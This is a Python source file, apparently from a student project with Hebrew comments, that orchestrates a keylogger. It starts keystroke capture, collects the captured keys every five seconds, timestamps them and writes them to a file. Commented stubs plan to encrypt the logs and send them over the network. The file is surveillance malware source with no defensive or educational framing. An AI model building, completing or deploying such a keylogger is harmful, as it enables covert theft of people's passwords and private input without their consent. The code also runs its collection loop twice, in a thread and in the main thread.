import time,datetime ,ctypes,threading
from kyllog import mein_keylogg
from FileWriter import FileWriter


class Manager:

    def __init__(self):
        self.keylogger = mein_keylogg()
        self.file_writer = FileWriter()
        self.buffer = []
        self.running = False

    def collect_keys(self):
        while self.running:
            try:
                time.sleep(5)
                logged_keys = self.keylogger.get_logged_keys()
                if logged_keys:
                    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                    data = {timestamp:logged_keys}
                    #הצפנה
                    # encrypted_data = Encryptor.encrypt(data)
                    #מישהו צריך לעשות פונקציית הצפנה

                    #שליחה לקובץ
                    self.file_writer.Writes_to_file(data)

                    #שליחה לרשת
                    if self.file_writer.Writes_to_network:
                        # self.network_writer.send(encrypted_data)
                        pass

                    #ניקוי
                    self.buffer.clear()
            except Exception as e:
                print(f"Error collecting keystrokes: {e}")

    def start(self):
        self.running = True
        self.keylogger.start_logging()
        threading.Thread(target=self.collect_keys, daemon=True).start()
        self.collect_keys()

    def stop(self):
        self.running = False
        self.keylogger.stop_logging()


a = Manager()
a.start()



    # def time_manager(self):
    #     self.time_man = datetime.datetime.fromtimestamp(self.logger.time).strftime(keylogger_manager.current_time)





























